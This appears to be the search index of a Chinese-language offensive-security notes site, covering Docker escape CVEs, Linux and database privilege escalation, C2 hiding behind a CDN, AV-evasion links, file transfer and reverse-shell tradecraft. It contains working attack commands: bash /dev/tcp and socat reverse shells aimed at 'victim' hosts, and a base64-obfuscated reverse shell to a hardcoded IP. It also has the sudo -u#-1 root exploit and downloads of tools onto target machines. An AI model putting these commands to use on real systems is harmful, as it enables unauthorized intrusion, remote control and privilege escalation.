最后，在容器内运行一个可以崩溃的程序即可，例如：\n# include \u0026lt;stdio.h\u0026gt; int main(void) { int *a = NULL; *a = 1; return 0; } 可以在其他机器上编译好以后再上传到容器里\n方法二：使用CDK # https://github.com/cdk-team/CDK/releases/\n./cdk eva 发现容器挂载了宿主机的procfs\n执行命令\n./cdk run mount-procfs /host/proc $command 六. 脏牛漏洞实现Docker逃逸 # Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。\n竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。\n在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。\n漏洞条件 # docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机。\n七. runC容器逃逸漏洞 # runc是Docker、CRI-O、Containerd、Kubernetes等底层的容器运行时\n1. CVE-2019-5736 # 影响版本 # Docker Version \u0026lt;=18.09.2 runC Version \u0026lt;=1.0-rc6\n漏洞利用 # https://github.com/Frichetten/CVE-2019-5736-PoC\n或使用CDK\n2. CVE-2021-30465 # https://cactusii.github.io/post/cve-2021-30465-runc-tao-yi-lou-dong/\nhttps://cloud.tencent.com/developer/article/1835722\n存在一定的机率问题，使用docker等单个容器管理很难看到效果\n影响版本 # runc \u0026lt;= 1.0.0-rc94\n3. CVE-2024-21626 # https://nitroc.org/posts/cve-2024-21626-illustrated\n影响版本 # runC 大于等于 v1.0.0-rc93，小于等于 1.1.11。\ncontainerd 的已修复版本为 1.6.28 和 1.7.13。受影响版本范围为 1.4.7 到 1.6.27 和 1.7.12。\ndocker 的已修复版本为 25.0.2。\n八. CVE-2020-15257逃逸 # https://www.freebuf.com/vuls/259292.html\n2020年12月01日，Containerd 官方发布安全更新，修复了 Docker 容器逃逸漏洞（CVE-2020-15257）。 Containerd 是一个控制 runC 的守护进程，提供命令行客户端和API，用于在一个机器上管理容器。在特定网络条件下，攻击者可通过访问containerd-shim API，从而实现Docker容器逃逸。Containerd是行业标准的容器运行时，可作为Linux和Windows的守护程序使用。在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行。\n由于在host模式下，容器与host共享一套Network namespaces，此时containerd-shim API暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。所以当一个容器root权限，且容器的网络模式为\u0026ndash;net=host的时候，通过ontainerd-shim API可以达成容器逃逸的目的。\n影响版本 # containerd \u0026lt; 1.4.3 containerd \u0026lt; 1.3.9\n漏洞利用 # https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn\n"},{"id":21,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86/","title":"密码收集","section":"Docs","content":" 密码收集 # "},{"id":22,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/","title":"扫描工具","section":"Docs","content":" 内网扫描工具 # fscan # https://github.com/shadow1ng/fscan\n"},{"id":23,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/","title":"文件传输","section":"Docs","content":" 内网文件传输 # nc + cat # 发送端 # nc -lvnp 7777 \u0026lt; file.txt 接收端 # cat \u0026lt; /dev/tcp/sender_ip/7777 \u0026gt; file.txt python # python2 # python -m SimpleHTTPServer 8080 python3 # python3 -m http.server 8080 nc # https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/\nhttps://nmap.org/ncat/guide/ncat-file-transfer.html\nscp # scp file.txt user@host:/path rsync # rsync -avz -e ssh file.txt user@host:/path wget # wget http://example.com/file.txt curl # curl -O http://example.com/file.txt tftp # tftp tftp\u0026gt; connect tftp\u0026gt; get file.txt ftp # ftp ftp\u0026gt; open ftp\u0026gt; get file.txt smbclient # smbclient //host/share smb: \\\u0026gt; get file.txt smbget # smbget -R smb://host/share "},{"id":24,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0/","title":"相关文章","section":"Docs","content":" 内网相关链接 # Active Directory \u0026amp; Kerberos Abuse # https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/\n域控常见打法总结 # https://mp.weixin.qq.com/s/Td3FIuvDZ1aofro6nCaQLw\n史上最强内网渗透知识点总结 # https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==\u0026mid=2247487491\u0026idx=1\u0026sn=270336c6cca79b4a4e5d777d41ce71b7\u0026chksm=ec1e202bdb69a93\n"},{"id":25,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/cs%E9%9A%90%E5%8C%BF/cobaltstrike+cdn/","title":"Cobalt Strike Cdn","section":"Docs","content":" CS CDN 隐匿 # 获取源服务器证书，pem+key # openssl pkcs12 -export -in $yourname.pem -inkey $yourname.key -out keystore.p12 -name \u0026#34;$yourname\u0026#34; keytool -importkeystore -deststorepass $yourpassword -destkeypass $yourpassword -destkeystore $yourname.store -srckeystore keystore.p12 -srcstoretype PKCS12 -srcstorepass $yourpassword -alias \u0026#34;$yourname\u0026#34; "},{"id":26,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/php%E5%86%85%E5%AD%98%E9%A9%AC/","title":"Php内存马","section":"Docs","content":" PHP 内存马 # https://mp.weixin.qq.com/s/KUA531d_3PKDsUSVgvX0CQ\n"},{"id":27,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/webshell%E5%85%8D%E6%9D%80/","title":"Web Shell免杀","section":"Docs","content":" WebShell免杀 # https://github.com/AabyssZG/WebShell-Bypass-Guide\n"},{"id":28,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/","title":"免杀","section":"Docs","content":" 免杀 # https://github.com/icyguider/Shhhloader\n"},{"id":29,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/","title":"Linux提权","section":"Docs","content":" Linux提权 # https://book.hacktricks.xyz/linux-hardening/privilege-escalation\n自动化工具 # Traitor # Automatically exploit low-hanging fruit to pop a root shell. Linux privilege escalation made easy!\nLinux 自动化提权二进制文件 交互式 https://github.com/liamg/traitor PEASS-ng # Privilege Escalation Awesome Scripts SUITE new generation\nlinPEAS and winPEAS are powerful scripts that search for possible paths to escalate privileges on Windows and Linux/Unix* hosts. Linux\u0026amp;Windows 提权漏洞探测脚本 https://github.com/carlospolop/PEASS-ng sudo su # 如果当前用户有sudo权限，可以使用sudo su提权\nSUID 提权 # https://securiumsolutions.com/privilege-escalation-with-suid-in-linux/\nSUID 提权是一种利用 Linux 系统中具有 SUID 权限的文件来获取 root 权限的技术。SUID（Set User ID）是一种特殊的文件权限，它可以让用户以文件所有者的身份运行该文件。如果该文件的所有者是 root 用户，那么运行该文件的用户就可以暂时获得 root 权限，从而执行一些需要高权限的操作。\n如果设置了 GUID 位，那么运行该文件的用户就可以暂时获得文件所属组的权限。\nSUID 提权的前提条件是：\n文件的所有者是 root 用户或其他超级用户 文件具有 SUID 权限（即文件权限中有 s 位） 文件是二进制可执行文件，且能够执行命令操作 chmod u+s filename #设置 SUID 位 chmod u-s filename #去掉 SUID 设置 find / -perm -u=s -type f 2\u0026gt;/dev/null # 在 Linux 系统中用于查找具有\u0026#34;SetUID\u0026#34;权限位设置的可执行文件的命令 # -perm 表示按照文件权限来搜索 # -u=s 表示查找具有\u0026#34;SetUID\u0026#34;权限位的文件 # -type f: 这个选项告诉 find 命令只查找普通文件，而不是目录或其他类型的文件。 # 2\u0026gt;/dev/null: 这是一个重定向操作，将标准错误输出（stderr）重定向到/dev/null，这样可以将任何错误消息静默化，以便只输出符合条件的文件列表。 # SUID find / -perm -4000 -type f -ls 2\u0026gt;/dev/null # GUID find / -perm -2000 -type f -ls 2\u0026gt;/dev/null 已知可用来提权的 linux 文件 # nmap vim find bash more less nano cp awk \u0026hellip; 内核漏洞提权 # SUDO提权 # CVE-2019-14287 # sudo版本小于1.8.28\nsudo切换用户：sudo -u jack /bin/bash或sudo -u#1000 /bin/bash\nexp：sudo -u#-1 /bin/bash\n-1被sudo解释成0\nsudo -l # sudo -l https://gtfobins.github.io/\n计划任务提权 # cat /etc/crontab 定时任务\n查看文件权限\nls -l /etc/cron* NFS 提权 # Capabilities 位提权 # https://www.cnblogs.com/sparkdev/p/11417781.html\n探查有 CAP_SETUID 标志的进程 /sbin/getgap -r / 2\u0026gt;/dev/null\ncapability 名称 描述 CAP_AUDIT_CONTROL 启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则 CAP_AUDIT_READ 允许通过 multicast netlink 套接字读取审计日志 CAP_AUDIT_WRITE 将记录写入内核审计日志 CAP_BLOCK_SUSPEND 使用可以阻止系统挂起的特性 CAP_CHOWN 修改文件所有者的权限 CAP_DAC_OVERRIDE 忽略文件的 DAC 访问限制 CAP_DAC_READ_SEARCH 忽略文件读及目录搜索的 DAC 访问限制 CAP_FOWNER 忽略文件属主 ID 必须和进程用户 ID 相匹配的限制 CAP_FSETID 允许设置文件的 setuid 位 CAP_IPC_LOCK 允许锁定共享内存片段 CAP_IPC_OWNER 忽略 IPC 所有权检查 CAP_KILL 允许对不属于自己的进程发送信号 CAP_LEASE 允许修改文件锁的 FL_LEASE 标志 CAP_LINUX_IMMUTABLE 允许修改文件的 IMMUTABLE 和 APPEND 属性标志 CAP_MAC_ADMIN 允许 MAC 配置或状态更改 CAP_MAC_OVERRIDE 覆盖 MAC(Mandatory Access Control) CAP_MKNOD 允许使用 mknod() 系统调用 CAP_NET_ADMIN 允许执行网络管理任务 CAP_NET_BIND_SERVICE 允许绑定到小于 1024 的端口 CAP_NET_BROADCAST 允许网络广播和多播访问 CAP_NET_RAW 允许使用原始套接字 CAP_SETGID 允许改变进程的 GID CAP_SETFCAP 允许为文件设置任意的 capabilities CAP_SETPCAP 参考 capabilities man page CAP_SETUID 允许改变进程的 UID CAP_SYS_ADMIN 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等 CAP_SYS_BOOT 允许重新启动系统 CAP_SYS_CHROOT 允许使用 chroot() 系统调用 CAP_SYS_MODULE 允许插入和删除内核模块 CAP_SYS_NICE 允许提升优先级及设置其他进程的优先级 CAP_SYS_PACCT 允许执行进程的 BSD 式审计 CAP_SYS_PTRACE 允许跟踪任何进程 CAP_SYS_RAWIO 允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备 CAP_SYS_RESOURCE 忽略资源限制 CAP_SYS_TIME 允许改变系统时钟 CAP_SYS_TTY_CONFIG 允许配置 TTY 设备 CAP_SYSLOG 允许使用 syslog() 系统调用 CAP_WAKE_ALARM 允许触发一些能唤醒系统的东西（比如 CLOCK_BOOTTIME_ALARM 计时器） "},{"id":30,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/mysql%E6%8F%90%E6%9D%83/","title":"My Sql提权","section":"Docs","content":" MySQL提权 # https://www.freebuf.com/articles/web/264790.html\nUDF提权 # MOF提权 # 启动项重启提权 # "},{"id":31,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/sqlserver%E6%8F%90%E6%9D%83/","title":"SQL Server提权","section":"Docs","content":" SQLServer提权 # xp_cmdshell提权 # sp_oacreate提权 # "},{"id":32,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E8%BF%9C%E6%8E%A7/%E4%BC%98%E5%8C%96shell/","title":"优化shell","section":"Docs","content":" 优化 shell # Reverse Shell Cheat Sheet # https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/{ip}/{port} 0\u0026gt;\u0026amp;1\u0026#39; echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzUyLjEzOS4xNTYuMzMvNDQ0NCAwPiYxJw== | base64 -d | bash Upgrading Simple Shells to Fully Interactive TTYs # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/\n交互式 shell # 设置环境变量 # export TERM=xterm-256color python pty # dpkg -l | grep python which python whereis python 查看是否有 python 环境\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 可以实现简单的 tty，但是这种方式有个问题，当我们 Ctrl+C 的时候，所有连接都会断掉，又需要重新来一遍，而且 vim 虽然可以用，也有点问题，同时没有记录，无法使用上方向键执行上条命令。\nUpgrading from netcat with magic # 首先，使用Python生成一个PTY。一旦bash在PTY中运行，用 Ctrl-Z 将shell放到后台。\n当 shell 处于后台时，现在检查当前终端和 STTY 信息，以便我们可以强制连接的 shell 与其匹配\n所需信息是 TERM 类型（“xterm-256color”）和当前 TTY 的大小（“rows 38; columns 116”）\n在仍然处于后台的情况下，现在将当前的STTY设置为原始类型，并使用以下命令告诉它回显输入字符:\nstty raw -echo 使用原始的stty，输入/输出会看起来很奇怪，你看不到下一个命令，但当你输入时，它们会被处理。\n使用 fg 将 shell 置于前台。它将重新打开反向 shell，但格式将会出错。最后，使用 reset 重新初始化终端。\n注意：我没有再次输入 nc 命令（因为它可能看起来像上面）。我实际输入了 fg ，但没有回显。 nc 命令是当前正在前台运行的作业。然后在netcat shell中输入了 reset 命令\n在 reset 之后，shell 应该再次看起来正常。最后一步是设置 shell、终端类型和 stty 大小，以匹配我们当前的 Kali 窗口（根据上面收集的信息）。\nexport SHELL=bash export TERM=xterm256-color stty rows 38 columns 116 最终结果是通过netcat连接实现的具有所有我们期望的功能的完全交互式TTY（包括制表补全、历史记录、作业控制等）。\nsocat (only linux) # socat 是类 Unix 系统下的一个工具，可以看作是 nc 的加强版。我们可以使用 socat 来传递完整的带有 tty 的 TCP 连接。缺点也很明显，只能在 linux 下面运行\n下载地址：https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat\n使用起来也很简单。\n攻击机：\n# 首先安装 sudo apt install socat # 执行 socat file:`tty`,raw,echo=0 tcp-listen:4444 目标机：\n# 把 socat 上传到目标机器上或者直接下载 # 64 位 wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat #32 位 wget https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx86.bin -O /tmp/socat #从攻击机下载 攻击机指令：python3 -m http.server 8888 # 运行 chmod +x /tmp/socat /tmp/socat exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane tcp:IP:4444 这种方式基本和 ssh 类似，ctrl+C 也不会直接断开。\n速查表 # 使用Python进行伪终端 # python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 使用 socat # #Listener: socat file:`tty`,raw,echo=0 tcp-listen:4444 #Victim: socat exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 使用stty选项 # # In reverse shell python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Ctrl-Z # In Kali echo $TERM stty -a stty raw -echo fg # In reverse shell reset export SHELL=bash export TERM=xterm-256color stty rows \u0026lt;num\u0026gt; columns \u0026lt;cols\u0026gt; "}]